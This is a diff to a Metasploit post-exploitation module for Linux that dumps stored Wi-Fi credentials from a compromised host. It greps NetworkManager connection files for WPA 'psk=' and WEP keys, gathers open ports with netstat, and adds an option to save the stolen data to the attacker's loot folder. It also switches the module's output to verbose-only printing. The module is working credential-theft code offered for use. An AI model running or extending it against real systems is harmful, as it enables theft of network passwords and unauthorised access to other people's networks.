@@ -22,12 +22,13 @@
 # [ MODULE OPTIONS ]
 # The session number to run this module on => set SESSION 3
 # Dump credentials from remote system      => set DUMP_CREDS true
+# Store credentials in msf loot folder?    => set STORE_CREDS true
 # The default path for network connections => set REMOTE_DIR /etc/NetworkManager/system-connections
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
 # Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/wifi_dump_linux.rb
-# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gathern/wifi_dump_linux.rb
+# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gather/wifi_dump_linux.rb
 # Manually Path Search: root@kali:~# locate modules/post/linux/gather
 #
 #
@@ -117,8 +118,13 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('REMOTE_DIR', [ true, 'The default path for network connections']),
                                 OptString.new('DUMP_CREDS', [ false, 'Dump credentials from remote system', false])
+                        ], self.class)
+
+                register_advanced_options(
+                        [
+                                OptString.new('STORE_CREDS', [ false, 'Store credentials in msf loot folder?', false]),
+                                OptString.new('REMOTE_DIR', [ true, 'The default path for network connections'])
                         ], self.class)
  
         end
@@ -137,11 +143,11 @@ def ls_stage1
   # to prevent 'unset all' from deleting default options...
   #
   if datastore['DUMP_CREDS'] == 'nil'
-    print_error("Options not configurated correctly...")
-    print_warning("Please set DUMP_CREDS option...")
+    vprint_error("Options not configurated correctly...")
+    vprint_warning("Please set DUMP_CREDS option...")
     return nil
   else
-    print_status("Dumping remote credentials ..")
+    vprint_status("Dumping remote credentials ..")
     Rex::sleep(1.0)
   end
 
@@ -149,34 +155,55 @@ def ls_stage1
     # Check if NetworkManager path exists ..
     #
     if not session.fs.dir.exist?(rpath)
-      print_error("Remote path: #{rpath} not found ..")
-      print_line("")
+      vprint_error("Remote path: #{rpath} not found ..")
+      vprint_line("")
       return nil
     end
 
       #
-      # build logfile with results (dump) in target %temp% folder
+      # Dump wifi credentials and network info from target system (wpa/wep)
       #
-      wlan_out = cmd_exec("sudo grep psk= /etc/NetworkManager/system-connections/*")
+      wpa_out = cmd_exec("sudo grep psk= /etc/NetworkManager/system-connections/*")
       wep_out = cmd_exec("sudo grep wep-key0= /etc/NetworkManager/system-connections/*")
+      open_ports = cmd_exec("/bin/netstat -tulpn")
+      Rex::sleep(1.0)
+
       #
-      # Display results on screen ..
+      # Display results on screen (wpa|wep|netstat) dump/gather info ..
       #
-      print_line("")
-      print_good("Wlan dump:")
-      print_good(wlan_out)
-      print_line("")
+      vprint_line("")
+      vprint_line("WPA CREDENTIALS:")
+      vprint_line("----------------")
+      vprint_line(wpa_out)
+      vprint_line("")
       Rex::sleep(0.5)
-      print_good("Wep dump:")
-      print_good(wep_out)
-      print_line("")
+      vprint_line("WEP CREDENTIALS:")
+      vprint_line("----------------")
+      vprint_line(wep_out)
+      vprint_line("")
+      Rex::sleep(0.5)
+      vprint_line("REMOTE OPEN PORTS:")
+      vprint_line("----------------")
+      vprint_line(open_ports)
+      vprint_line("")
+
+    #
+    # Store dump in msf loot folder ..
+    # TODO: check if local loot file was created ..
+    #
+    if datastore['STORE_CREDS'] == true
+      vprint_good("Downloading dump to msf loot folder ..")
+      loot_path = store_loot("wpa/wep dump", "text/plain", session, wpa_out, wep_out, open_ports, "wpa/wep credentials dump")
+      vprint_status("File stored in: #{loot_path}")
+      vprint_line("")
+    end
 
   #
   # error exception funtion
   #
   rescue ::Exception => e
-  print_error("Error Running Command: #{e.class} #{e}")
-  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
+  vprint_error("Error Running Command: #{e.class} #{e}")
+  vprint_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
 end
 
 
@@ -197,20 +224,20 @@ def run
 
 
     # Print banner and scan results on screen
-    print_line("    +--------------------------------------------+")
-    print_line("    |     * ESSID WIFI PASSWORD DUMP LINUX *     |")
-    print_line("    |            Author : r00t-3xp10it           |")
-    print_line("    +--------------------------------------------+")
-    print_line("")
-    print_line("    Running on session  : #{datastore['SESSION']}")
-    print_line("    Target Architecture : #{sysnfo['Architecture']}")
-    print_line("    Computer            : #{sysnfo['Computer']}")
-    print_line("    Operative System    : #{sysnfo['OS']}")
-    print_line("    Target IP addr      : #{runsession}")
-    print_line("    Payload directory   : #{directory}")
-    print_line("    Client UID          : #{runtor}")
-    print_line("")
-    print_line("")
+    vprint_line("    +--------------------------------------------+")
+    vprint_line("    |     * ESSID WIFI PASSWORD DUMP LINUX *     |")
+    vprint_line("    |            Author : r00t-3xp10it           |")
+    vprint_line("    +--------------------------------------------+")
+    vprint_line("")
+    vprint_line("    Running on session  : #{datastore['SESSION']}")
+    vprint_line("    Target Architecture : #{sysnfo['Architecture']}")
+    vprint_line("    Computer            : #{sysnfo['Computer']}")
+    vprint_line("    Operative System    : #{sysnfo['OS']}")
+    vprint_line("    Target IP addr      : #{runsession}")
+    vprint_line("    Payload directory   : #{directory}")
+    vprint_line("    Client UID          : #{runtor}")
+    vprint_line("")
+    vprint_line("")
 
 
     #
@@ -220,14 +247,14 @@ def run
     # check for proper operative system (Linux)
     #
     if not sysinfo['OS'] =~ /Linux/
-      print_error("[ABORT]: This module only works againt Linux systems")
+      vprint_error("[ABORT]: This module only works againt Linux systems")
       return nil
     end
     #
     # Check if we are running in an higth integrity context (root)
     #
     if not is_root?
-      print_error("[ABORT]: Root access is required to dump creds ..")
+      vprint_error("[ABORT]: Root access is required to dump creds ..")
       return nil
     end
     #
@@ -235,9 +262,9 @@ def run
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
     if not sysinfo.nil?
-      print_status("Running module against: #{sysnfo['Computer']}")
+      vprint_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("[ABORT]: This module only works in meterpreter sessions!")
+      vprint_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
     end
 
